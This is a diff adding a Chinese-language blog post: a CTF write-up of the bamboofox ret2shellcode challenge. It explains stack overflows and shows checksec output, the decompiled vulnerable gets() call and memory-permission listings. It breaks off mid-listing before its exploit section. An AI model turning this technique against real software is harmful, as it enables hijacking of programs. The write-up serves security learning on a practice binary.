@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">[bamboofox] ret2shellcode [CTFwiki] | a39&#39;s blog</title>
+<meta property="og:title" content="[bamboofox] ret2shellcode [CTFwiki] | a39&#39;s blog" />
+<meta name="twitter:title" content="[bamboofox] ret2shellcode [CTFwiki] | a39&#39;s blog" />
+<meta itemprop="name" content="[bamboofox] ret2shellcode [CTFwiki] | a39&#39;s blog" />
+<meta name="application-name" content="[bamboofox] ret2shellcode [CTFwiki] | a39&#39;s blog" />
+<meta property="og:site_name" content="Awesome hugo blog" />
+
+<meta name="description" content="PWN bamboofox ret2shellcode CTFwiki">
+<meta itemprop="description" content="PWN bamboofox ret2shellcode CTFwiki" />
+<meta property="og:description" content="PWN bamboofox ret2shellcode CTFwiki" />
+<meta name="twitter:description" content="PWN bamboofox ret2shellcode CTFwiki" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="https://asuka39.github.io/posts/2022-10-19-ret2shellcode/" title="English" />
+
+
+
+  <meta itemprop="image" content="https://asuka39.github.io/" />
+  <meta property="og:image" content="https://asuka39.github.io/" />
+  <meta name="twitter:image" content="https://asuka39.github.io/" />
+  <meta name="twitter:image:src" content="https://asuka39.github.io/" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2022-10-19T00:00:00Z />
+    <meta property="article:published_time" content=2022-10-19T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="A39" />
+    <meta property="article:author" content="A39" />
+    <meta name="author" content="A39" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "[bamboofox] ret2shellcode [CTFwiki]",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2022-10-19",
+        "description": "PWN bamboofox ret2shellcode CTFwiki",
+        "wordCount":  658 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2022-10-19",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "a39\u0027s blog"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.124.1">
+
+    
+
+    <link rel="canonical" href="https://asuka39.github.io/posts/2022-10-19-ret2shellcode/">
+    <link href="/style.min.4f425fac94f4dc104bcea9917ddb61e42c44aacaff8ba84ffc9040717f5b9d72.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/favicon.ico">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon.ico">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon.ico">
+    <link rel="mask-icon" href="/icons/favicon.ico">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://asuka39.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://asuka39.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/friends/">
+                        Friends
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">[bamboofox] ret2shellcode [CTFwiki]</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2022-10-19T00:00:00&#43;00:00" itemprop="datePublished"> 19 Oct 2022 </time>
+                </div>
+                
+            </header>
+            
+    
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#栈溢出">栈溢出</a>
+      <ul>
+        <li><a href="#基本原理">基本原理</a></li>
+        <li><a href="#ret2shellcode">ret2shellcode</a></li>
+      </ul>
+    </li>
+    <li><a href="#题目">题目</a>
+      <ul>
+        <li><a href="#exp">EXP</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h2 id="栈溢出">栈溢出</h2>
+<h3 id="基本原理">基本原理</h3>
+<p>栈溢出（Stack Overflow）指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，.bss段溢出等溢出方式</p>
+<p>关于C语言函数调用栈篇幅较长，可以参看大佬文章</p>
+<ul>
+<li><a href="http://www.cnblogs.com/clover-toeic/p/3755401.html">C 语言函数调用栈 (一)</a></li>
+<li><a href="http://www.cnblogs.com/clover-toeic/p/3756668.html">C 语言函数调用栈 (二)</a></li>
+</ul>
+<p>以下是一个简单的程序栈模型</p>
+<p>在程序执行函数调用后，会将原函数的程序栈底地址<code>ebp</code>、返回地址<code>retaddr</code>压入栈中，使子程序执行完毕后重新跳转回原程序继续执行</p>
+<p>栈空间是从高地址向低地址增长的。但是，若函数中用到了数组作为局部变量时，向数组的赋值时的增长方向是从低地址到高地址的，与栈的增长方向相反。若对未限制数组的赋值边界，则可能对数组进行恶意的越界写入，便会把栈中的数据覆盖，造成栈溢出漏洞</p>
+<p><img alt="img" src="./img/2022101663123858000-1cfpqu.png"></p>
+<p><img alt="img" src="./img/202210stack-e1666497546412.png"></p>
+<p>不难想到，攻击栈溢出漏洞的一般主要思路就是：填满变量栈空间并溢出覆盖返回地址，使子程序调用完毕后跳转至其他代码段（比如后台代码）</p>
+<p>需要注意的是，32 位和 64 位程序有以下简单的区别</p>
+<ul>
+<li>x86
+<ul>
+<li>函数参数在函数返回地址的上方</li>
+</ul>
+</li>
+<li>x64
+<ul>
+<li>System V AMD64 ABI（Linux、FreeBSD、macOS 等采用）中前六个整型或指针参数依次保存在RDI,RSI,RDX,RCX,R8和R9寄存器中，如果还有更多的参数的话才会保存在栈上</li>
+<li>内存地址不能大于0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常</li>
+</ul>
+</li>
+</ul>
+<p>栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程</p>
+<p>此外，我们也不难发现，发生栈溢出的基本前提是</p>
+<ul>
+<li>程序必须向栈上写入数据</li>
+<li>写入的数据大小没有被良好地控制</li>
+</ul>
+<p>C和C++里常见的可以被利用的函数有</p>
+<ul>
+<li>输入
+<ul>
+<li><code>gets</code>：直接读取一行，忽略<code>\x00</code></li>
+<li><code>scanf</code></li>
+<li><code>vscanf</code></li>
+</ul>
+</li>
+<li>输出
+<ul>
+<li><code>sprintf</code></li>
+</ul>
+</li>
+<li>字符串
+<ul>
+<li><code>strcpy</code>：字符串复制，遇到<code>\x00</code>停止</li>
+<li><code>strcat</code>：字符串拼接，遇到<code>\x00</code>停止</li>
+<li><code>bcopy</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="ret2shellcode">ret2shellcode</h3>
+<p>ret2shellcode即控制程序执行shellcode代码，是栈溢出漏洞的一种利用方法。shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell</p>
+<p>一般来说，shellcode需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</p>
+<p>在栈溢出的基础上，要想执行shellcode，则需要对应的二进制程序在运行时shellcode所在的区域具有可执行权限</p>
+<h2 id="题目">题目</h2>
+<p>首先还是老套路checksec看看文件信息和保护情况，这里是一个几乎没开保护的32位ELF文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/c/Users/asuka/Desktop/CTF/wiki/pwn/ret2shellcode/ret2shellcode&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX disabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    RWX:      Has RWX segments
+</span></span></code></pre></div><p>拖进32位IDA里反编译一下，发现<code>get</code>函数，感觉可以栈溢出</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span> <span class="c1">// [esp+1Ch] [ebp-64h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;No system for you this time !!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">gets</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">strncpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mh">0x64u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;bye bye ~&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>但是在文件里没有找到后台程序，于是无法ret2text获取shell了</p>
+<p>先别急，可以看到有段复制字符串的代码<code>strncpy(buf2, s, 0x64u);</code>，意为将输入的字符串<code>s</code>复制给<code>buf2</code>，但是main函数的变量声明里并没有<code>buf2</code>，所以这是一个全局变量，编译时会被写在.bss段里</p>
+<p>在IDA里也能验证我们的想法，<code>buf2</code>地址为0x0804A080</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o
+</code></pre><p>那我们来看看.bss段的权限如何</p>
+<p>将断点设在main函数处，vmmap查看.bss段的读写执行权限，发现是<code>rwxp</code>，即有执行权限</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vmmap</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
+</span></span><span class="line"><span class="cl"> <span class="mh">0x8048000</span>  <span class="mh">0x8049000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">1000</span> <span class="mi">0</span>      <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="err">桌面</span><span class="o">/</span><span class="err">题目</span><span class="o">/</span><span class="n">wiki</span><span class="o">/</span><span class="n">ret2shellcode</span><span class="o">/</span><span class="n">ret2shellcode</span>
+</span></span><span class="line"><span class="cl"> <span class="mh">0x8049000</span>  <span class="mh">0x804a000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">1000</span> <span class="mi">0</span>      <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="err">桌面</span><span class="o">/</span><span class="err">题目</span><span class="o">/</span><span class="n">wiki</span><span class="o">/</span><span class="n">ret2shellcode</span><span class="o">/</span><span class="n">ret2shellcode</span>
+</span></span><span class="line"><span class="cl"> <span class="mh">0x804a000</span>  <span class="mh">0x804b000</span> <span class="n">rwxp</span>     <span class="mi">1000</span> <span class="mi">1000</span>   <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="err">桌面</span><span class="o">/</span><span class="err">题目</span><span class="o">/</span><span class="n">wiki</span><span class="o">/</span><span class="n">ret2shellcode</span><span class="o">/</span><span class="n">ret2shellcode</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7dca000</span> <span class="mh">0xf7fb2000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>   <span class="mf">1e8000</span> <span class="mi">0</span>      <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.31</span><span class="p">.</span><span class="n">so</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fb2000</span> <span class="mh">0xf7fb3000</span> <span class="o">---</span><span class="n">p</span>     <span class="mi">1000</span> <span class="mf">1e8000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.31</span><span class="p">.</span><span class="n">so</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fb3000</span> <span class="mh">0xf7fb5000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">2000</span> <span class="mf">1e8000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.31</span><span class="p">.</span><span class="n">so</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fb5000</span> <span class="mh">0xf7fb6000</span> <span class="n">rwxp</span>     <span class="mi">1000</span> <span class="mi">1</span><span class="n">ea000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="o">-</span><span class="mf">2.31</span><span class="p">.</span><span class="n">so</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fb6000</span> <span class="mh">0xf7fb9000</span> <span class="n">rwxp</span>     <span class="mi">3000</span> <span class="mi">0</span>      
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fcb000</span> <span class="mh">0xf7fcd000</span> <span class="n">rwxp</span>     <span class="mi">2000</span> <span class="mi">0</span>      
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fcd000</span> <span class="mh">0xf7fd0000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">3000</span> <span class="mi">0</span>      <span class="p">[</span><span class="n">vvar</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fd0000</span> <span class="mh">0xf7fd1000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">1000</span> <span class="mi">0</span>      <span class="p">[</span><span class="n">vdso</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fd1000</span> <span class="mh">0xf7ffb000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>    <span class="mi">2</span><span class="n">a000</span> <span class="mi">0</span>      <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.31</span><span class="p">.</span><span class="n">so</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7ffc000</span> <span class="mh">0xf7ffd000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">1000</span> <span class="mi">2</span><span class="n">a000</span>  <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.31</span><span class="p">.</span><span class="n">so</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7ffd000</span> <span class="mh">0xf7ffe000</span> <span class="n">rwxp</span>     <span class="mi">1000</span> <span class="mi">2</span><span class="n">b000</span>  <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="mf">2.31</span><span class="p">.</span><span class="n">so</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xfffdd000</span> <span class="mh">0xffffe000</span> <span class="n">rwxp</span>    <span class="mi">21000</span> <span class="mi">0</span>      <span class="p">[</span><span class="n">stack</span><span class="p">]</span>
+</span></span></code></pre></div><p>这里要避个雷，在我的Ubuntu 22.04（WSL2）里显示的是<code>rw-p</code>，即没有执行权限，如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vmmap</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
+</span></span><span class="line"><span class="cl"> <span class="mh">0x8048000</span>  <span class="mh">0x8049000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">1000</span> <span class="mi">0</span>      <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">c</span><span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="n">asuka</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">CTF</span><span class="o">/</span><span class="n">wiki</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">ret2shellcode</span><span class="o">/</span><span class="n">ret2shellcode</span>
+</span></span><span class="line"><span class="cl"> <span class="mh">0x8049000</span>  <span class="mh">0x804a000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span> <span class="mi">0</span>      <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">c</span><span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="n">asuka</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">CTF</span><span class="o">/</span><span class="n">wiki</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">ret2shellcode</span><span class="o">/</span><span class="n">ret2shellcode</span>
+</span></span><span class="line"><span class="cl"> <span class="mh">0x804a000</span>  <span class="mh">0x804b000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">1000</span> <span class="mi">1000</span>   <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">c</span><span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="n">asuka</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">CTF</span><span class="o">/</span><span class="n">wiki</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">ret2shellcode</span><span class="o">/</span><span class="n">ret2shellcode</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7d7e000</span> <span class="mh">0xf7d9e000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>    <span class="mi">20000</span> <span class="mi">0</span>      <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7d9e000</span> <span class="mh">0xf7f20000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>   <span class="mi">182000</span> <span class="mi">20000</span>  <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7f20000</span> <span class="mh">0xf7fa5000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>    <span class="mi">85000</span> <span class="mi">1</span><span class="n">a2000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fa5000</span> <span class="mh">0xf7fa6000</span> <span class="o">---</span><span class="n">p</span>     <span class="mi">1000</span> <span class="mi">227000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fa6000</span> <span class="mh">0xf7fa8000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">2000</span> <span class="mi">227000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fa8000</span> <span class="mh">0xf7fa9000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">1000</span> <span class="mi">229000</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">i386</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fa9000</span> <span class="mh">0xf7fb3000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="n">a000</span> <span class="mi">0</span>      <span class="p">[</span><span class="n">anon_f7fa9</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fbe000</span> <span class="mh">0xf7fc0000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">2000</span> <span class="mi">0</span>      <span class="p">[</span><span class="n">anon_f7fbe</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fc0000</span> <span class="mh">0xf7fc4000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">4000</span> <span class="mi">0</span>      <span class="p">[</span><span class="n">vvar</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xf7fc4000</span> <span class="mh">0xf7fc6000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span>     <span class="mi">2000</span> <span class="mi">0</span>      <span class="p">[</span><span class="n">vdso</span><span class="p">]</span>
